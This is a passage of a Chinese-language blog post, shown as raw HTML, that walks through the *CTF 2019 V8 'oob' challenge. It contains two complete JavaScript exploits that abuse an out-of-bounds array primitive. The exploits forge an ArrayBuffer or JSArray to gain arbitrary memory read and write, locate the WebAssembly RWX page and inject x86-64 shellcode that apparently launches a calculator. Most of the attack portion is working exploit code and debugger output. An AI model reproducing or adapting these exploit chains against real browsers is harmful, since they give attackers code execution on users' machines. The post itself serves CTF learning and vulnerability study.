class="number">0x3ac2ec75f7a0</span>:	<span class="number">0x000055eaa54af3c0</span>	<span class="number">0x000002d98eee0000</span>	&lt;---RWX area</span><br><span class="line"><span class="number">0x3ac2ec75f7b0</span>:	<span class="number">0x00000c416a70e421</span>	<span class="number">0x00000c416a70e5d9</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>即<code>instance+0x88</code>处即存放了RWX区域的地址</p><h2 id="利用流程（方法一）"><a href="#利用流程（方法一）" class="headerlink" title="利用流程（方法一）"></a>利用流程（方法一）</h2><ol><li>创建一个数组fake_ab，在element中伪造一个ArrayBuffer</li><li>创建一个double数组和一个object数组，将fake_ab放入object数组中</li><li>分别泄露出double map和object map</li><li>使用double map覆盖object数组的Map，使object数组将其元素当做小数来解析</li><li>从object中读取出fake_ab的地址，通过固定的偏移（使用splice()）计算出elements的地址（即伪造的ArrayBuffer）</li><li>将elements地址写入objects数组中，并还原objects数组的Map</li><li>重新将elements取出来，这时将会将其作为一个ArrayBuffer</li><li>因为elements可以通过fake_ab随意修改，所以我们可以通过控制backingStore来实现任意读写了。</li></ol><p><strong>关于伪造ArrayBuffer</strong></p><p>在伪造ArrayBuffer的时候需要同时也伪造出它的Map，这部分可以通过调试一个真正的ArrayBuffer并将其Map复制下来（这里并不需要全部的数据）。关于Map的内存模型可以参考<a href="https://github.com/v8/v8/blob/master/src/objects/map.h" target="_blank" rel="noopener">这里</a>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_arraybuffer = [</span><br><span class="line">	<span class="comment">//map|properties</span></span><br><span class="line">    mem.u2d(<span class="number">0x0</span>),mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	<span class="comment">//elements|length</span></span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),mem.u2d(<span class="number">0x1000</span>),</span><br><span class="line">	<span class="comment">//backingstore|0x2</span></span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),mem.u2d(<span class="number">0x2</span>),</span><br><span class="line">	<span class="comment">//padding</span></span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	<span class="comment">//fake map</span></span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),mem.u2d(<span class="number">0x1900042319080808</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x00000000082003ff</span>),mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),mem.u2d(<span class="number">0x0</span>)</span><br><span class="line">].splice(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">12</span>gx <span class="number">0x214d3d2421b9</span><span class="number">-1</span>						&lt;-- <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>)的<span class="built_in">Map</span></span><br><span class="line"><span class="number">0x214d3d2421b8</span>:	<span class="number">0x00003255d5d40189</span>	<span class="number">0x1900042319080808</span></span><br><span class="line"><span class="number">0x214d3d2421c8</span>:	<span class="number">0x00000000082003ff</span>	<span class="number">0x000015f53700e981</span></span><br><span class="line"><span class="number">0x214d3d2421d8</span>:	<span class="number">0x000015f53700e7e9</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>EXP</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;   </span><br><span class="line">    d2u(val)&#123;</span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;   </span><br><span class="line">    u2d(val)&#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = []; </span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> mem = <span class="keyword">new</span> Memory();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7f</span>, <span class="number">0x03</span>, <span class="number">0x82</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0a</span>, <span class="number">0x8a</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x84</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x0b</span></span><br><span class="line">  ]);</span><br><span class="line"><span class="keyword">const</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasm_code));</span><br><span class="line"><span class="keyword">const</span> wasm_func = wasm_instance.exports.a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_arraybuffer = [</span><br><span class="line">	<span class="comment">//map|properties</span></span><br><span class="line">    mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	<span class="comment">//elements|length</span></span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x1000</span>),</span><br><span class="line">	<span class="comment">//backingstore|0x2</span></span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x2</span>),</span><br><span class="line">	<span class="comment">//padding</span></span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	<span class="comment">//fake map</span></span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x1900042319080808</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x00000000082003ff</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x0</span>)</span><br><span class="line">].splice(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>).splice(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> obj = [wasm_instance, fake_arraybuffer, ab].splice(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> buf = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>].splice(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">obj_map = mem.d2u(obj.oob());	<span class="comment">//读取map</span></span><br><span class="line">buf_map = mem.d2u(buf.oob());</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"obj_map addr: 0x"</span> + obj_map.toString(<span class="number">16</span>))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"buf_map addr: 0x"</span> + buf_map.toString(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">obj.oob(mem.u2d(buf_map));		<span class="comment">//将obj数组的map改为double map</span></span><br><span class="line"></span><br><span class="line">wasm_inst_addr = mem.d2u(obj[<span class="number">0</span>]) - <span class="number">1</span>;	<span class="comment">//读取wasm_instance的地址</span></span><br><span class="line">rwx_area_addr = wasm_inst_addr + <span class="number">0x88</span>	<span class="comment">//获取rwx地址的存放地址</span></span><br><span class="line"></span><br><span class="line">fake_ab_addr = mem.d2u(obj[<span class="number">1</span>]) - <span class="number">1</span>;		<span class="comment">//读取fake_arraybuffer的地址</span></span><br><span class="line">fake_obj_addr = fake_ab_addr - <span class="number">0x80</span>;	<span class="comment">//获取fake_arraybuffer的elements的地址</span></span><br><span class="line">fake_obj_map = fake_ab_addr - <span class="number">0x40</span>;		<span class="comment">//获取伪造的map地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"fake_ab_addr: 0x"</span> + fake_ab_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"rwx_area_addr: 0x"</span> + rwx_area_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_arraybuffer[<span class="number">0</span>] = mem.u2d(fake_obj_map + <span class="number">1</span>);	<span class="comment">//将伪造的map填入</span></span><br><span class="line">fake_arraybuffer[<span class="number">4</span>] = mem.u2d(rwx_area_addr);		<span class="comment">//将rwx地址的存放地址填入backingStore</span></span><br><span class="line"></span><br><span class="line">obj[<span class="number">2</span>] = mem.u2d(fake_obj_addr + <span class="number">1</span>);	<span class="comment">//将elements地址写入obj数组</span></span><br><span class="line">obj.oob(mem.u2d(obj_map));				<span class="comment">//恢复obj数组的map</span></span><br><span class="line"></span><br><span class="line">fake_obj = <span class="keyword">new</span> <span class="built_in">DataView</span>(obj[<span class="number">2</span>]);		<span class="comment">//将伪造的ArrayBuffer取出</span></span><br><span class="line">rwx_area = mem.d2u(fake_obj.getFloat64(<span class="number">0</span>, <span class="literal">true</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"rwx_area: 0x"</span> + rwx_area.toString(<span class="number">16</span>));	<span class="comment">//读取rwx空间的地址</span></span><br><span class="line"></span><br><span class="line">fake_arraybuffer[<span class="number">4</span>] = mem.u2d(rwx_area);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; shellcode.length; i++)&#123;</span><br><span class="line">    fake_obj.setUint32(i * <span class="number">4</span>, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wasm_func();</span><br></pre></td></tr></table></figure><h2 id="利用流程（方法二）"><a href="#利用流程（方法二）" class="headerlink" title="利用流程（方法二）"></a>利用流程（方法二）</h2><p>和前面一个差不多，这里不需要伪造ArrayBuffer和它的map，只需要伪造一个JSArray即可，因为通过修改elements指针也可以实现任意读写。</p><p>但是有个问题是，在访问某地址时，需要将elements指针置于该地址-0x10处，因为rwx空间是独立的一块内存页，在其-0x10处的地址是非法的，所以最后还是通过修改ArrayBuffer的backingStore来布置shellcode。</p><p><strong>EXP</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;   </span><br><span class="line">    d2u(val)&#123;</span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;   </span><br><span class="line">    u2d(val)&#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = []; </span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> mem = <span class="keyword">new</span> Memory();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7f</span>, <span class="number">0x03</span>, <span class="number">0x82</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0a</span>, <span class="number">0x8a</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x84</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x0b</span></span><br><span class="line">  ]);</span><br><span class="line"><span class="keyword">const</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasm_code));</span><br><span class="line"><span class="keyword">const</span> wasm_func = wasm_instance.exports.a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">	<span class="comment">//map|properties</span></span><br><span class="line">    mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	<span class="comment">//elements|length</span></span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x100000000000</span>),</span><br><span class="line">	<span class="comment">//backingstore|0x2</span></span><br><span class="line">	mem.u2d(<span class="number">0x0</span>),</span><br><span class="line">	mem.u2d(<span class="number">0x2</span>),</span><br><span class="line">].splice(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = [wasm_instance, fake_array, <span class="number">1.1</span>].splice(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> buf = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>].splice(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">obj_map = mem.d2u(obj.oob());</span><br><span class="line">buf_map = mem.d2u(buf.oob());</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"obj_map addr: 0x"</span> + obj_map.toString(<span class="number">16</span>))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"buf_map addr: 0x"</span> + buf_map.toString(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">obj.oob(mem.u2d(buf_map));</span><br><span class="line"></span><br><span class="line">wasm_inst_addr = mem.d2u(obj[<span class="number">0</span>]) - <span class="number">1</span>;</span><br><span class="line">rwx_area_addr = wasm_inst_addr + <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">fake_array_addr = mem.d2u(obj[<span class="number">1</span>]) - <span class="number">1</span>;</span><br><span class="line">fake_obj_addr = fake_array_addr - <span class="number">0x30</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"fake_obj_addr: 0x"</span> + fake_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"rwx_area_addr: 0x"</span> + rwx_area_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_array[<span class="number">0</span>] = mem.u2d(buf_map);</span><br><span class="line"></span><br><span class="line">obj[<span class="number">2</span>] = mem.u2d(fake_obj_addr + <span class="number">1</span>);</span><br><span class="line">obj.oob(mem.u2d(obj_map));</span><br><span class="line">fake_obj = obj[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arb_read</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">	fake_array[<span class="number">2</span>] = mem.u2d(addr - <span class="number">0x10</span> + <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> mem.d2u(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arb_write</span>(<span class="params">addr, value</span>)</span>&#123;</span><br><span class="line">	fake_array[<span class="number">2</span>] = mem.u2d(addr - <span class="number">0x10</span> + <span class="number">1</span>);</span><br><span class="line">	fake_obj[<span class="number">0</span>] = mem.u2d(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rwx_area = arb_read(rwx_area_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"rwx_area: 0x"</span> + rwx_area.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line">obj[<span class="number">2</span>] = ab;</span><br><span class="line">obj.oob(mem.u2d(buf_map));</span><br><span class="line"></span><br><span class="line">ab_addr = mem.d2u(obj[<span class="number">2</span>]) - <span class="number">1</span>;</span><br><span class="line">ab_backStore = ab_addr + <span class="number">0x20</span>;</span><br><span class="line">arb_write(ab_backStore, rwx_area);</span><br><span class="line"></span><br><span class="line">ab_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; shellcode.length; i++)&#123;</span><br><span class="line">	ab_view.setUint32(i * <span class="number">4</span>, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wasm_func()</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://4hou.win/wordpress/?p=32405" target="_blank" rel="noopener">从一道CTF题零基础学V8漏洞利用</a></li><li><a href="https://xz.aliyun.com/t/5368" target="_blank" rel="noopener">Chrome v8 exploit - OOB</a></li><li><a href="http://eternalsakura13.com/2019/04/29/*ctf_oob/" target="_blank" rel="noopener">star ctf chrome oob writeup</a></li><li><a href="https://github.com/vngkv123/aSiagaming/blob/master/Chrome-v8-oob/README.md" target="_blank" rel="noopener">starctf 2019 - OOB by vngkv123</a></li><li><a href="https://p1umer.github.io/2019/05/06/Star-CTF-OOB-writeup/" target="_blank" rel="noopener">StarCTF OOB writeup by p1umer</a></li><li><a href="https://changochen.github.io/2019-04-29-starctf-2019.html" target="_blank" rel="noopener">*CTF 2019 oob-v8 by Ne0</a></li></ul></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Hpasserby</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://hpasserby.top/post/825d66e8.html">https://hpasserby.top/post/825d66e8.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hpasserby.top">Hpasserby</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/v8/">v8</a><a class="post-meta__tags" href="/tags/OOB/">OOB</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="/images/alipay.jpg"><div class="post-qr-code__desc">支付宝赞赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" 